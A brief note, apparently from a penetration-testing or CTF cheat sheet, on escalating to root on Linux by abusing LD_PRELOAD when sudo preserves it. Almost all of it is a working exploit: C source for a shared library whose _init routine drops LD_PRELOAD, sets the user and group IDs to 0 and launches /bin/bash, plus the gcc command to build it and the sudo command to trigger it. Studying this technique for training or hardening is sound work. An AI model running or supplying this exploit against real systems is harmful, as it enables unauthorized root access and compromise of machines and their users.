if LD_PRELOAD is an environment variable (`sudo -l`), allowing any program to use a shared library
*LD_PRELOAD option will be ignored if real user ID is different from effective user ID.* 
Creates a c program in the shared library that opens a root shell

	#include <stdio.h>  
	#include <sys/types.h>  
	#include <stdlib.h>  
	
	void _init() {  
	unsetenv("LD_PRELOAD");  
	setgid(0);  
	setuid(0);  
	system("/bin/bash");  
	}

compile to the shared library with: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
then run sudo-able program with `sudo LD_PRELOAD=PATH/shell.so COMMAND` 